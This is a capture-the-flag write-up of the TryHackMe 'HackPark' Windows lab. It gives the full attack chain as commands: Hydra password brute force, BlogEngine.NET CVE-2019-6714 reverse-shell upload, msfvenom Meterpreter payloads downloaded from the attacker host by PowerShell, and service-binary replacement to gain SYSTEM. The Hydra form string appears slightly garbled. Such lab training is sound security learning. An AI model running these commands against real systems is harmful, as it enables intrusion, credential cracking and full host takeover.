# THM — HackPark

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **OS:** Windows  
> **Tags:** `#thm` `#web` `#hydra` `#metasploit` `#privesc` `#blogengine` `#cve-2019-6714` `#windows`

---

## Kill Chain Summary

```
Nmap Scan → Login Page Discovery → Hydra Brute Force → BlogEngine RCE (CVE-2019-6714)
→ Netcat Shell → Meterpreter Upgrade → Binary Replacement (WindowsScheduler) → SYSTEM
```

---

## 1. Reconnaissance — Nmap Scan

**Command:**

```bash
nmap -sC -sV -oN scan.txt <TARGET_IP>
```

**Key results:**

| Port | State | Service | Notes |
|------|-------|---------|-------|
| 80/tcp | open | HTTP | Microsoft IIS — web application |
| 3389/tcp | open | RDP | Remote Desktop open |

Browsing to port 80 reveals a blog. Navigating through the site, the admin login panel is found at:

```
http://<TARGET_IP>/admin/login.aspx
```

---

## 2. Web Exploitation — Brute Force with Hydra

No credentials available. We intercept the login request with **Burp Suite** to extract the exact POST parameters and form fields, then launch a dictionary attack with **Hydra**.

**Command:**

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
"/admin/login.aspx:__VIEWSTATE=^USER^&__EVENTVALIDATION=^PASS^\
&Login1\$UserName=^USER^&Login1\$Password=^PASS^&Login1\$LoginButton=Log+in:Login failed"
```

> 💡 **Note:** The exact `__VIEWSTATE` and `__EVENTVALIDATION` values must be captured from the live login page via Burp Suite — they are dynamically generated and cannot be hardcoded.

✅ Credentials found. Login as administrator is successful.

Inside the admin panel, the CMS version is identified: **BlogEngine.NET 3.3.6.0**.

---

## 3. Initial Access — RCE via CVE-2019-6714

Searching Exploit-DB, this version of BlogEngine.NET is vulnerable to a **Directory Traversal Remote Code Execution** (CVE-2019-6714).

**Exploit procedure:**

**Step 1 — Prepare the payload**

Download the exploit and rename it to exactly `PostView.ascx`. Edit the file, replacing the IP and port with your VPN interface (`tun0`) values.

```bash
# Edit the reverse shell IP and port inside PostView.ascx
LHOST = <YOUR_TUN0_IP>
LPORT = 4444
```

**Step 2 — Start the listener**

```bash
nc -lvnp 4444
```

**Step 3 — Upload via File Manager**

From the admin panel: **Content → Posts → File Manager**. Upload `PostView.ascx`. The file lands in `/App_Data/files`.

**Step 4 — Trigger the vulnerability**

```
http://<TARGET_IP>/?theme=../../App_Data/files
```

✅ Reverse shell received as `IIS APPPOOL\BlogEngine`.

> ⚠️ The shell obtained at this stage is unstable and limited. Upgrading to Meterpreter is the next priority.

---

## 4. Shell Upgrade — Meterpreter via msfvenom

**Step 1 — Generate the payload (Kali)**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=5555 -f exe -o shell.exe
```

**Step 2 — Host the file**

```bash
python3 -m http.server 80
```

**Step 3 — Download from the target (Windows shell)**

```powershell
powershell -c "iwr -uri http://<YOUR_IP>/shell.exe -OutFile C:\Windows\Temp\shell.exe"
```

**Step 4 — Start the handler (Metasploit)**

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 5555
run
```

**Step 5 — Execute on target**

```cmd
C:\Windows\Temp\shell.exe
```

✅ Stable Meterpreter session established.

---

## 5. Privilege Escalation — Binary Replacement (WindowsScheduler)

Enumerating `C:\Program Files (x86)`, a suspicious third-party directory is found: **SystemScheduler**.

**Analysis:**

- A Windows service named **WindowsScheduler** runs periodically.
- It executes a binary called **Message.exe** inside the SystemScheduler folder.
- The current user has **write permissions** on that directory — a critical misconfiguration.

**Attack — Binary Replacement:**

**Step 1 — Backup the original binary**

```cmd
ren Message.exe Message.bak
```

**Step 2 — Generate a new payload named Message.exe**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=6666 -f exe -o Message.exe
```

**Step 3 — Upload the malicious binary**

```bash
# From Meterpreter session
upload /path/to/Message.exe Message.exe
```

**Step 4 — Start a new handler and wait**

```bash
use exploit/multi/handler
set LPORT 6666
run
```

The scheduled service executes `Message.exe` under **NT AUTHORITY\SYSTEM** privileges.

✅ New Meterpreter session received as `NT AUTHORITY\SYSTEM`.

---

## 6. Flags

```cmd
# User flag
type C:\Users\jeff\Desktop\user.txt

# Root flag
type C:\Users\Administrator\Desktop\root.txt
```

---

## 7. Vulnerability Summary

| # | Finding | Severity | Detail |
|---|---------|----------|--------|
| 1 | BlogEngine.NET 3.3.6.0 RCE | 🔴 Critical | CVE-2019-6714: Directory Traversal leads to arbitrary file execution |
| 2 | Admin panel publicly exposed | 🟡 Medium | `/admin/login.aspx` reachable with no lockout policy |
| 3 | Weak admin credentials | 🔴 High | Password cracked via rockyou.txt dictionary |
| 4 | WindowsScheduler write permissions | 🔴 Critical | Third-party service running as SYSTEM with world-writable binary path |

---

## 8. Key Takeaways

- **Exact naming matters:** CVE-2019-6714 requires the payload to be named exactly `PostView.ascx` — any deviation breaks execution. Always read exploit documentation carefully before running.
- **CMD vs Linux syntax:** Inside a raw Windows shell, only DOS commands work (`ren`, `dir`, `type`). Mixing Linux syntax (`mv`, `ls`, `cat`) is a common failure point. Meterpreter abstracts this, but raw shells do not.
- **Third-party software is attack surface:** The privilege escalation vector was not a Windows bug — it was a misconfigured third-party scheduler running as SYSTEM with a world-writable binary. This is a realistic and frequently overlooked scenario in corporate environments.
- **Always stabilize the shell:** Upgrade unstable web/Netcat shells to Meterpreter as early as possible. Losing shell access mid-engagement wastes time and increases noise on the target.

---

## Quick Reference — Key Commands

```bash
# Recon
nmap -sC -sV -oN scan.txt <TARGET_IP>

# Brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
"/admin/login.aspx:...:Login failed"

# Listener (initial shell)
nc -lvnp 4444

# Payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=5555 -f exe -o shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=6666 -f exe -o Message.exe

# File hosting
python3 -m http.server 80

# Download on target
powershell -c "iwr -uri http://<IP>/shell.exe -OutFile C:\Windows\Temp\shell.exe"

# Flags
type C:\Users\jeff\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

*Writeup completed on 30/03/2026 — TryHackMe / HackPark*
